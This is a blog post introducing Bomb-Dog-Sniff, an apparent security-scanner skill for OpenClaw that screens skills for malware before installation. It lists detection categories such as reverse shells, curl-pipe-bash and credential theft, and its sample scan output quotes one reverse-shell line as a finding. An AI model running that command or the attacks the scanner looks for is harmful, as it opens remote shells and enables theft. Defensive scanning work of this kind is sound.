---
layout: post
title: "Bomb-Dog-Sniff: Your OpenClaw Security Scanner"
date: 2026-03-12T00:18:37
categories: [24854]
original_url: https://insightginie.com/bomb-dog-sniff-your-openclaw-security-scanner
---

What is Bomb-Dog-Sniff?
-----------------------

Bomb-Dog-Sniff is a security-first skill management tool for OpenClaw that acts like a bomb-sniffing dog for skills. It scans skills for malicious patterns before installation, ensuring only safe skills make it to your system. Think of it as your personal security guard that sniffs out threats like crypto stealers, keyloggers, reverse shells, and other malicious payloads before they can harm your system.

Why You Need Bomb-Dog-Sniff
---------------------------

In today’s open-source ecosystem, installing skills from untrusted sources can be risky. Malicious actors often hide dangerous code in seemingly innocent skills. Bomb-Dog-Sniff provides a crucial security layer by:

* Detecting crypto wallet stealers and private key harvesters
* Identifying reverse shells and remote code execution attempts
* Finding keyloggers and credential theft mechanisms
* Spotting supply chain attacks and typosquatting attempts
* Preventing prototype pollution vulnerabilities
* Blocking malicious npm/yarn scripts

Core Security Features
----------------------

Bomb-Dog-Sniff v1.2.0 includes comprehensive security hardening:

* **Command Injection Protection**: Fixed vulnerabilities in download functions
* **Path Traversal Protection**: Sanitizes all path inputs to prevent directory traversal attacks
* **Secure Quarantine**: Randomized directory names with restricted permissions (0o700)
* **Binary File Detection**: Skips binary files to avoid false positives
* **File Size Limits**: Prevents DoS via huge files with configurable limits
* **ReDoS Protection**: Limits regex processing on long lines to prevent regular expression denial of service

Detection Capabilities
----------------------

The scanner uses 60+ detection patterns across 13 categories:

### Critical Threats

* **Crypto Harvester**: Private key extraction, wallet exports, mnemonic theft
* **Credential Theft**: Environment variable exfiltration, config file theft, SSH key theft
* **Reverse Shell**: Netcat shells, /dev/tcp/ redirects, socket-based shells, eval of remote code
* **Keylogger**: Keyboard capture with exfiltration, clipboard theft, password field monitoring
* **Malicious Script**: Pre/postinstall doing network/exec operations, modifying other packages

### High-Risk Threats

* **Encoded Payload**: Base64 execution chains, hex escapes with eval context, obfuscated code
* **Suspicious API**: Pastebin/ngrok/webhook destinations, dynamic URL construction with secrets
* **Pipe Bash**: curl | bash, wget | sh patterns
* **Deposit Scam**: “Send ETH to 0x…”, payment prompts in unexpected contexts
* **Supply Chain**: Typosquatting, dynamic requires, suspicious postinstall scripts
* **Prototype Pollution**: Dangerous object merging, \_\_proto\_\_ manipulation

### Medium-Risk Threats

* **Network Exfiltration**: File reading followed by network transmission
* **File Tamper**: .bashrc modification, crontab editing, SSH authorized\_keys manipulation

Risk Scoring System
-------------------

Bomb-Dog-Sniff uses a comprehensive risk scoring system from 0-100:

* **0-19: SAFE** ✅ Install freely
* **20-39: LOW** ⚠️ Review recommended
* **40-69: SUSPICIOUS** 🚫 Blocked by default
* **70-100: MALICIOUS** ☠️ Never install

Each finding adds to the score based on severity and confidence:

* **CRITICAL**: +25 points × confidence multiplier
* **HIGH**: +15 points × confidence multiplier
* **MEDIUM**: +5 points × confidence multiplier

Confidence multipliers: High (1.0×), Medium (0.75×), Low (0.5×). Score caps at 100.

Available Commands
------------------

### scan

Scan a skill directory for malicious patterns:

```
openclaw skill bomb-dog-sniff scan <path> [options]
```

Options:

* `-j, --json`: Output JSON only
* `-v, --verbose`: Show detailed findings
* `-t, --threshold N`: Set risk threshold (default: 40)

### safe-install

Download from clawhub/GitHub, scan, and install only if safe:

```
openclaw skill bomb-dog-sniff safe-install <source> [options]
```

Source can be ClawHub skill name, GitHub URL, or local path.

### audit

Audit an already-installed skill:

```
openclaw skill bomb-dog-sniff audit <skill-name> [options]
```

### batch

Scan multiple skills from a list file:

```
openclaw skill bomb-dog-sniff batch <list-file>
```

How It Works
------------

### Safe Install Process

The secure installation follows a 5-step process:

1. **QUARANTINE**: Skill downloaded to /tmp/bds-q-<random>/ with restricted permissions
2. **SCAN**: Check all files against detection patterns, skip binary/empty/large files, calculate entropy
3. **DECISION**: Risk > threshold? → BLOCK & DELETE, Risk ≤ threshold? → PROCEED
4. **INSTALL**: Move from quarantine to skills directory, backup existing installation
5. **CLEANUP**: Securely remove quarantine directory

Quick Start Guide
-----------------

### Scan Before Installing

```
# Sniff out threats before installing
openclaw skill bomb-dog-sniff scan ./downloaded-skill
```

### Safe Install from ClawHub

```
# Safe install from clawhub (auto-downloads, sniffs, installs if clean)
openclaw skill bomb-dog-sniff safe-install cool-skill
```

### Audit Installed Skills

```
# Audit an already-installed skill
openclaw skill bomb-dog-sniff audit bird
```

### Batch Scanning

```
# Batch scan multiple skills
openclaw skill bomb-dog-sniff batch skills-to-audit.txt
```

Real-World Example
------------------

Here’s what a typical scan output looks like:

```
🔍 Bomb-Dog-Sniff Security Scanner v1.2.0
Target: /home/user/skills/untrusted-skill

🔴 CRITICAL (2)
──────────────────────────────────────────────────
crypto_harvester: scripts/wallet.js:23
Crypto wallet private key harvesting detected
Code: const privateKey = "a1b2c3..."
Confidence: high

reverse_shell: scripts/backdoor.sh:5
Reverse shell or remote code execution detected
Code: bash -i >& /dev/tcp/192.168.1.100/4444
Confidence: high

🟠 HIGH (1)
──────────────────────────────────────────────────
pipe_bash: install.sh:12
Dangerous curl | bash pattern detected
Confidence: high

═══════════════════════════════════════════════════
SCAN SUMMARY
═══════════════════════════════════════════════════
☠️ Risk Score: 75/100
Risk Level: MALICIOUS
Duration: 125ms
Files Scanned: 12/15
Files Skipped: 3 (binary/empty/large)
Findings: 3
Severity Breakdown:
🔴 CRITICAL: 2
🟠 HIGH: 1

📋 Recommendation:
MALICIOUS - Do not install. Found 3 critical security issues.
Scan ID: bds-20260208-a1b2c3d4
```

Security Best Practices
-----------------------

To maximize your security when using Bomb-Dog-Sniff:

1. Always scan skills before installation, even from trusted sources
2. Use a conservative risk threshold (lower = more cautious)
3. Regularly audit your installed skills
4. Keep Bomb-Dog-Sniff updated for the latest threat patterns
5. Combine with other security tools for defense in depth

Conclusion
----------

Bomb-Dog-Sniff provides essential security for the OpenClaw ecosystem. By automatically scanning skills for malicious patterns before installation, it prevents countless potential security incidents. Whether you’re a casual user or managing critical infrastructure, Bomb-Dog-Sniff gives you peace of mind by ensuring only safe, verified skills make it to your system.

Remember: In the world of open-source software, security isn’t optional—it’s essential. Let Bomb-Dog-Sniff be your first line of defense against malicious skills.

Skill can be found at: <https://github.com/openclaw/skills/tree/main/skills/lvcidpsyche/skill-bomb-dog-sniff/SKILL.md>